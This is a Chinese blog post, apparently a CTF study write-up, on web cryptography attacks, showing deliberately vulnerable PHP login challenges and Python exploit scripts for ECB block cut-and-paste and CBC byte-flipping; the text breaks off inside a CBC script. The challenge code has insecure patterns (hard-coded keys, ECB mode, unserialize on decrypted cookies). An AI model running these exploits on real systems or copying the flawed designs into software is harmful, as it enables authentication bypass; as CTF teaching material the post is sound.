<!DOCTYPE html>
<html lang=zh-CN>
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI" />
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta property="og:description" content="">
    <meta property="og:type" content="website">
    <meta name="description" content="">
    <meta name="keyword"  content="">
    <link rel="shortcut icon" href="/img/favicon.ico">

    <title>
        
        CTF中常见的Web密码学攻击方式 - undefined
        
    </title>

    <!-- Custom CSS -->
    
<link rel="stylesheet" href="/css/aircloud.css">

    
<link rel="stylesheet" href="/css/gitment.css">

    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
    <link href="//at.alicdn.com/t/font_620856_28hi1hpxx24.css" rel="stylesheet" type="text/css">
    <!-- ga & ba script hoook -->
    <script></script>
<meta name="generator" content="Hexo 6.2.0"></head>

<body>

<div class="site-nav-toggle" id="site-nav-toggle">
    <button>
        <span class="btn-bar"></span>
        <span class="btn-bar"></span>
        <span class="btn-bar"></span>
    </button>
</div>

<div class="index-about">
    <i>  </i>
</div>

<div class="index-container">
    
    <div class="index-left">
        
<div class="nav" id="nav">
    <div class="avatar-name">
        <div class="avatar ">
            <img src="/img/avatar.jpeg" />
        </div>
        <div class="name">
            <i>seaii</i>
        </div>
    </div>
    <div class="contents" id="nav-content">
        <ul>
            <li >
                <a href="/">
                    <i class="iconfont icon-shouye1"></i>
                    <span>主页</span>
                </a>
            </li>
            <li >
                <a href="/tags">
                    <i class="iconfont icon-biaoqian1"></i>
                    <span>标签</span>
                </a>
            </li>
            <li >
                <a href="/archives">
                    <i class="iconfont icon-guidang2"></i>
                    <span>存档</span>
                </a>
            </li>
            <li >
                <a href="/collect/">
                    <i class="iconfont icon-shoucang1"></i>
                    <span>收藏</span>
                </a>
            </li>
            <li >
                <a href="/about/">
                    <i class="iconfont icon-guanyu2"></i>
                    <span>关于</span>
                </a>
            </li>
            
        </ul>
    </div>
    
        <div id="toc" class="toc-article">
    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#ECB"><span class="toc-text">ECB</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CBC"><span class="toc-text">CBC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#padding-oracle-attack"><span class="toc-text">padding oracle attack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CFB"><span class="toc-text">CFB</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hash%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB"><span class="toc-text">hash长度扩展攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="toc-text">参考资料</span></a></li></ol>
</div>
    
</div>


<div class="search-field" id="search-field">
    <div class="search-bg" id="search-bg"></div>
    <div class="search-container">
        <div class="search-input">
            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
            <input id="search-input"/>
            <span id="begin-search">搜索</span>
        </div>
        <div class="search-result-container" id="search-result-container">

        </div>
    </div>
</div>

        <div class="index-about-mobile">
            <i>  </i>
        </div>
    </div>
    
    <div class="index-middle">
        <!-- Main Content -->
        


<div class="post-container">
    <div class="post-title">
        CTF中常见的Web密码学攻击方式
    </div>

    <div class="post-meta">
        <span class="attr">发布于：<span>2017-05-13 23:28:00</span></span>
        
        <span class="attr">标签：/
        
        <a class="tag" href="/tags/#ctf" title="ctf">ctf</a>
        <span>/</span>
        
        <a class="tag" href="/tags/#web" title="web">web</a>
        <span>/</span>
        
        <a class="tag" href="/tags/#密码学" title="密码学">密码学</a>
        <span>/</span>
        
        
        </span>
        <span class="attr">访问：<span id="busuanzi_value_page_pv"></span>
</span>
</span>
    </div>
    <div class="post-content ">
        <p>ctf中web题目一般会有一个或多个包含密码学的题目，这块一直是弱项，这几天恶补了一波，总结一下，方便之后复习、寻找思路。<br>写到最后发现有点多了，做个目录。。</p>
<ul>
<li><a href="#ECB">ECB</a></li>
<li><a href="#CBC">CBC</a></li>
<li><a href="#POA">Padding Oracle Attack</a></li>
<li><a href="#CFB">CFB</a></li>
<li><a href="#HASH">hash长度扩展攻击</a></li>
</ul>
<span id="more"></span>

<p><a name="ECB"></a></p>
<h3 id="ECB"><a href="#ECB" class="headerlink" title="ECB"></a>ECB</h3><p>参考： <a target="_blank" href="http://www.cnblogs.com/dacainiao/p/5521646.html">分组密码模式: ECB模式(电子密码本模式)</a><br>加、解密过程如图：<br><img src="http://seaii-blog.com/usr/uploads/2017/05/ecben.jpg"></p>
<p>可以看到明文分组和密文分组是一一对应的，且每一对分组都是单独加密的。那么攻击方式就很明显了，我们对某个密文分组进行修改，与之对应的明文在解密时就会被修改，由于每个分组是单独加密的，所以对其他的分组是没有影响的。<br>例题：<br>直接上代码吧:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">AES</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;     </span><br><span class="line">        <span class="variable">$privateKey</span> = <span class="string">&quot;12345678123456781234567812345678&quot;</span>;     </span><br><span class="line">        <span class="variable">$encrypted</span> = <span class="title function_ invoke__">mcrypt_encrypt</span>(MCRYPT_RIJNDAEL_128, <span class="variable">$privateKey</span>, <span class="variable">$data</span>, MCRYPT_MODE_ECB);     </span><br><span class="line">        <span class="variable">$encryptedData</span> = (<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$encrypted</span>));     </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$encryptedData</span>; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">DE__AES</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;     </span><br><span class="line">        <span class="variable">$privateKey</span> = <span class="string">&quot;12345678123456781234567812345678&quot;</span>;     </span><br><span class="line">        <span class="variable">$encryptedData</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$data</span>);     </span><br><span class="line">        <span class="variable">$decrypted</span> = <span class="title function_ invoke__">mcrypt_decrypt</span>(MCRYPT_RIJNDAEL_128, <span class="variable">$privateKey</span>, <span class="variable">$encryptedData</span>, MCRYPT_MODE_ECB);     </span><br><span class="line">        <span class="variable">$decrypted</span> = <span class="title function_ invoke__">rtrim</span>(<span class="variable">$decrypted</span>, <span class="string">&quot;\0&quot;</span>);     </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$decrypted</span>; </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (@<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>] == <span class="string">&#x27;reg&#x27;</span>)&#123;     </span><br><span class="line">        <span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;uid&#x27;</span>, <span class="title function_ invoke__">AES</span>(<span class="string">&#x27;9&#x27;</span>));     </span><br><span class="line">        <span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;username&#x27;</span>, <span class="title function_ invoke__">AES</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]));     </span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: ecb.php&quot;</span>);     </span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (@!<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;uid&#x27;</span>])||@!<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;username&#x27;</span>]))&#123;     </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;form method=&quot;post&quot; action=&quot;ecb.php?a=reg&quot;&gt; Username:&lt;br&gt;&#x27;</span>; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;input type=&quot;text&quot;  name=&quot;username&quot;&gt; &lt;br&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Password:&lt;br&gt; &lt;input type=&quot;text&quot; name=&quot;password&quot; &gt; &lt;br&gt;&lt;br&gt;&#x27;</span>; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;input type=&quot;submit&quot; value=&quot;register&quot;&gt;&#x27;</span>; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;/form&gt;&#x27;</span>; </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;     </span><br><span class="line">        <span class="variable">$uid</span> = <span class="title function_ invoke__">DE__AES</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;uid&#x27;</span>]);     </span><br><span class="line">        <span class="keyword">if</span> ( <span class="variable">$uid</span> != <span class="string">&#x27;4&#x27;</span>)&#123;         </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;uid:&#x27;</span> .<span class="variable">$uid</span> .<span class="string">&#x27;&lt;br/&gt;&#x27;</span>;         </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&#x27;</span> . <span class="title function_ invoke__">DE__AES</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;username&#x27;</span>]) .<span class="string">&#x27;&lt;br/&gt;&#x27;</span>;         </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;You are not administrotor!!&#x27;</span>;     </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;           </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Hi you are administrotor!!&quot;</span> .<span class="string">&#x27;&lt;br/&gt;&#x27;</span>;         </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;Flag is 360 become better&#x27;</span>;     </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<p>简单分析一下，只要<code>uid == 4</code>，就可以得到flag。而在前面将uid设置为9并加密，而且将注册的username也进行了加密，两者都使用了ebc加密。username是可控的，可以通过注册一个特殊的用户名来获得uid的密文进行替换。<br>首先我们通过fuzz来获取分组的长度，代码如下:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://10.10.10.1/test/ecb.php?a=reg&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">31</span>):</span><br><span class="line">    cookies = requests.post(url, data=&#123;<span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;a&#x27;</span>*i, <span class="string">&#x27;password&#x27;</span>:<span class="string">&#x27;1&#x27;</span>&#125;, allow_redirects=<span class="literal">False</span>).cookies</span><br><span class="line">    username = base64.b64decode(urllib.unquote(cookies[<span class="string">&#x27;username&#x27;</span>]))</span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">len</span>(<span class="string">&#x27;a&#x27;</span>*i), <span class="built_in">len</span>(username)</span><br></pre></td></tr></table></figure>
<p>通过查看username即密文的长度即可判断分组的长度</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line">13 16</span><br><span class="line">14 16</span><br><span class="line">15 16</span><br><span class="line">16 16</span><br><span class="line">17 32</span><br><span class="line">.......</span><br></pre></td></tr></table></figure>
<p>可以看到分组的长度为16，根据分析写出利用代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://10.10.10.1/test/ecb.php&quot;</span></span><br><span class="line"></span><br><span class="line">cookies = requests.post(url+<span class="string">&#x27;?a=reg&#x27;</span>, data=&#123;<span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;aaaaaaaaaaaaaaaa4&#x27;</span>, <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;123456&#x27;</span>&#125;, allow_redirects=<span class="literal">False</span>).cookies</span><br><span class="line"><span class="comment">#分组长度为16，所以注册一个长度为17的用户名。</span></span><br><span class="line"><span class="comment">#得到32位的密文，前16位为aaaaaaaaaaaaaaaa的密文，后16位为4的密文</span></span><br><span class="line">username = base64.b64decode(urllib.unquote(cookies[<span class="string">&#x27;username&#x27;</span>]))</span><br><span class="line">uid = urllib.quote_plus(base64.b64encode(username[<span class="number">16</span>:]))</span><br><span class="line"> </span><br><span class="line">r = requests.get(url, cookies=&#123;<span class="string">&#x27;uid&#x27;</span>: uid, <span class="string">&#x27;username&#x27;</span>: cookies[<span class="string">&#x27;username&#x27;</span>]&#125;)</span><br><span class="line"><span class="built_in">print</span> r.text</span><br></pre></td></tr></table></figure>
<p><a name="CBC"></a></p>
<h3 id="CBC"><a href="#CBC" class="headerlink" title="CBC"></a>CBC</h3><p>参考：<a target="_blank" href="http://www.cnblogs.com/dacainiao/p/5521866.html">分组密码模式: CBC模式(密码分组链接模式)</a><br><img src="http://seaii-blog.com/usr/uploads/2017/05/cbcen.jpg"></p>
<p>cbc加密方式同样是先进行分组，区别在于将上一组的密文先与下一组的明文进行XOR，然后在进行加密,解密过程类似。<br>cbc字节翻转攻击（<a href="http://www.tuicool.com/articles/vEVFZz" target="_blank">http://www.tuicool.com/articles/vEVFZz</a>）在ctf中非常常见，一般有两种攻击方式：</p>
<ol>
<li>iv向量，影响第一个明文分组</li>
<li>第n个密文分组，影响第n+1个明文分组</li>
</ol>
<p>其中第二个尤为常见，网上有很多题目，这里就不举例子了。放一个比较特殊的，上面两个攻击点都有利用，代码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html PUBLIC <span class="string">&quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot;</span> <span class="string">&quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;</span>&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=utf-8&quot;</span> /&gt;</span><br><span class="line">&lt;title&gt;Login Form&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;SECRET_KEY&quot;</span>, <span class="string">&#x27;kH3LH3sk45HLsd3n&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;METHOD&quot;</span>, <span class="string">&quot;aes-128-cbc&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_random_iv</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$random_iv</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="number">16</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="variable">$random_iv</span>.=<span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">rand</span>(<span class="number">1</span>,<span class="number">255</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$random_iv</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$info</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$iv</span> = <span class="title function_ invoke__">get_random_iv</span>();</span><br><span class="line">    <span class="variable">$plain</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$info</span>);</span><br><span class="line">    <span class="variable">$cipher</span> = <span class="title function_ invoke__">openssl_encrypt</span>(<span class="variable">$plain</span>, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, <span class="variable">$iv</span>);</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="variable">$info</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;iv&quot;</span>, <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$iv</span>));</span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;cipher&quot;</span>, <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$cipher</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_login</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;cipher&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;iv&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$cipher</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;cipher&#x27;</span>]);</span><br><span class="line">        <span class="variable">$iv</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;iv&quot;</span>]);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$plain</span> = <span class="title function_ invoke__">openssl_decrypt</span>(<span class="variable">$cipher</span>, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, <span class="variable">$iv</span>))&#123;</span><br><span class="line">            <span class="variable">$info</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$plain</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;&lt;p&gt;base64_decode(&#x27;&quot;</span>.<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$plain</span>).<span class="string">&quot;&#x27;) can&#x27;t unserialize&lt;/p&gt;&quot;</span>);</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="variable">$info</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;ERROR!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show_homepage</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>]===<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;p&gt;Hello admin&lt;/p&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;p&gt;Flag is SKCTF&#123;CBC_wEB_cryptography_6646dfgdg6&#125;&lt;/p&gt;&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;p&gt;hello &#x27;</span>.<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>].<span class="string">&#x27;&lt;/p&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;p&gt;Only admin can see flag&lt;/p&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;p&gt;&lt;a href=&quot;loginout.php&quot;&gt;Log out&lt;/a&gt;&lt;/p&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$username</span> = (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span> = (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$username</span> === <span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&#x27;&lt;p&gt;admin are not allowed to login&lt;/p&gt;&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$info</span> = <span class="keyword">array</span>(<span class="string">&#x27;username&#x27;</span>=&gt;<span class="variable">$username</span>,<span class="string">&#x27;password&#x27;</span>=&gt;<span class="variable">$password</span>);</span><br><span class="line">        <span class="title function_ invoke__">login</span>(<span class="variable">$info</span>);</span><br><span class="line">        <span class="title function_ invoke__">show_homepage</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>]))&#123;</span><br><span class="line">        <span class="title function_ invoke__">check_login</span>();</span><br><span class="line">        <span class="title function_ invoke__">show_homepage</span>();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;body class=&quot;login-body&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;div id=&quot;wrapper&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;div class=&quot;user-icon&quot;&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="string">                    &lt;div class=&quot;pass-icon&quot;&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="string">                    &lt;form name=&quot;login-form&quot; class=&quot;login-form&quot; action=&quot;&quot; method=&quot;post&quot;&gt;</span></span><br><span class="line"><span class="string">                        &lt;div class=&quot;header&quot;&gt;</span></span><br><span class="line"><span class="string">                        &lt;h1&gt;Login Form&lt;/h1&gt;</span></span><br><span class="line"><span class="string">                        &lt;span&gt;Fill out the form below to login to my super awesome imaginary control panel.&lt;/span&gt;</span></span><br><span class="line"><span class="string">                        &lt;/div&gt;</span></span><br><span class="line"><span class="string">                        &lt;div class=&quot;content&quot;&gt;</span></span><br><span class="line"><span class="string">                        &lt;input name=&quot;username&quot; type=&quot;text&quot; class=&quot;input username&quot; value=&quot;Username&quot; onfocus=&quot;this.value=\&#x27;\&#x27;&quot; /&gt;</span></span><br><span class="line"><span class="string">                        &lt;input name=&quot;password&quot; type=&quot;password&quot; class=&quot;input password&quot; value=&quot;Password&quot; onfocus=&quot;this.value=\&#x27;\&#x27;&quot; /&gt;</span></span><br><span class="line"><span class="string">                        &lt;/div&gt;</span></span><br><span class="line"><span class="string">                        &lt;div class=&quot;footer&quot;&gt;</span></span><br><span class="line"><span class="string">                        &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Login&quot; class=&quot;button&quot; /&gt;</span></span><br><span class="line"><span class="string">                        &lt;/div&gt;</span></span><br><span class="line"><span class="string">                    &lt;/form&gt;</span></span><br><span class="line"><span class="string">                &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;/body&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>大体流程就是注册一个用户，将数据序列化后加密，保存到cookie中。注册的用户不能是admin，但只有admin才能看到flag。iv和cipher都放在cookie中，就是可控的，我们可以注册一个<code>1dmin</code>用户，然后通过修改密文进行字节翻转将1翻转为a。但是这样做必然会将前一组数据破坏掉，导致解密出来的数据乱码。注意看check_login这个函数中的这行代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$info</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$plain</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;&lt;p&gt;base64_decode(&#x27;&quot;</span>.<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$plain</span>).<span class="string">&quot;&#x27;) can&#x27;t unserialize&lt;/p&gt;&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>如果数据被破坏，unserialize是无法执行成功的，我们就拿不到flag。还记得cookie里的iv吗？它并不是没有用的，我们需要再对iv进行翻转来保证第一个明文分组数据的正确性。不知道说的清不清楚，上个脚本吧。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span 